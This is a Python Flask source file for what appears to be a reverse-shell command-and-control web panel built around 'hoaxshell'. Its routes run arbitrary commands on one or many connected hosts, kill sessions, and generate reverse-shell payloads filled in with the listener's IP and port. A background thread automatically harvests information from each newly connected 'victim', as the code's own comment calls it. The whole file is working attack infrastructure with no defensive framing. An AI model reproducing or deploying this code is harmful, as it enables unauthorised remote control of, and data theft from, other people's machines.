from flask import Flask, request, Response, send_from_directory
from core.server import shellserver

# hoaxshell
import core.hoaxshell.payloads as hxPL
import core.hoaxshell.server as hxSrv

import socket
import random
import sys
import threading
import json
import base64

app = Flask(__name__)
port = int(sys.argv[1]) if len(sys.argv) >= 2 else random.randint(7000, 15535)
shell = shellserver(port=port)
threading.Thread(target=hxSrv.startServer, args=("0.0.0.0", port+1,), daemon=True).start()

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '0.0.0.0'
    finally:
        s.close()
    return IP

@app.route("/")
def index():
    return open("./core/http/index.html", "r").read()

@app.route("/shell")
def shellhtml():
    return open("./core/http/shell.html", "r").read()

@app.route("/chart.js")
def chartjs():
    return Response(open("./core/http/chart.js", "r").read(), mimetype='text/javascript')

@app.route("/api/data/clients")
def clientData():
    return shell.info

@app.route("/api/data/host")
def hostData():
    return {
        "listener": get_ip(),
        "port": str(port)
    }

@app.route("/api/shell/run", methods=["POST"])
def runcmd():
    a = request.get_json(force=True)

    if type(a["uid"]) != list:
        if len(a["uid"]) != 24:
            dta = shell.runCommand(a["uid"], a["command"])
        else:
            dta = hxSrv.interactive.run(a['command'], a["uid"], timeout=2.5)
        print(dta)
    else:
        for x in a["uid"]:
            print('exec on {}'.format(x))
            shell.runCommand(x, a["command"], _async=True)
        return "executed command \"{}\" on {} hosts".format(a["command"], len(a["uid"]))

    return dta

@app.route("/api/shell/delete", methods=["POST"])
def delete():
    a = request.get_json(force=True)

    if type(a["uid"]) != list:
        shell.killUID(a["uid"])
    else:
        for x in a["uid"]:
            # mortifying thing to say
            print('killed child {}'.format(x))
            shell.killUID(x)

        return "killed {} hosts".format(len(a["uid"]))

    return "ok"

# payload generation
@app.route("/api/generate/hoaxshell", methods=["POST"])
def hoaxshellPLGen():
    a = request.get_json(force=True)

    try:
        pl = hxPL.genPayload(a["payload"], get_ip(), port+1)
        hxSrv.shellData.allowedUIDS.append(pl["payloadId"])
        return pl
    except KeyError:
        return "invalid payload type"
    
    return "None"

@app.route("/api/generate/payload", methods=["POST"])
def normalPLGen():
    a = request.get_json(force=True)

    payloads = json.loads(open("./core/payloads.json", "r").read())

    # check if payload is in json file
    if a["payload"] not in list(payloads):
        return "invalid payload"
    else:
        b = payloads[a["payload"]]
        b["command"] = (base64.b64decode(b["command"].encode('ascii')).decode('ascii')).replace("{ip}", get_ip()).replace("{port}", str(port)).replace("{shell}", a.get("shell", "bash")) # LOTTA SPLICING AND COULD'VE PROBABLY BEEN DONE WITH REGEX BUT WHO CARES
        return b
    
@app.route("/api/generate/list", methods=["GET"])
def getPayloads():
    payloads = []

    payloads += list(json.loads(open("./core/payloads.json", "r").read())) # normal payloads
    payloads += ["hoax-cURL", "hoax-iex", "hoax-iex-constrained", "hoax-iex-outfile", "hoax-iex-const-out"] # hoaxshell payloads

    return {"payloads": payloads}


    

@app.route('/favicon.ico')
def favicon():
    return send_from_directory('./core/http/', 'icon.ico',mimetype='image/vnd.microsoft.icon')

@app.route('/refresh.png')
def refresh():
    return send_from_directory('./core/http/', 'refresh.png',mimetype='image/png')

def hoaxShellHarvester(): # the only point of this function is to automatically start asking questions of the most recently connected hoaxshell victim
    old = 0

    while True:
        while len(hxSrv.shellData.hxUIDS) == old:
            pass
    
        shell.info.update({hxSrv.shellData.hxUIDS[-1]: shell.harvestInfo(hxSrv.shellData.hxUIDS[-1], hxSrv.interactive.run)})

        old = len(hxSrv.shellData.hxUIDS)

threading.Thread(target=hoaxShellHarvester, daemon=True).start()
app.run(host="0.0.0.0", port=80)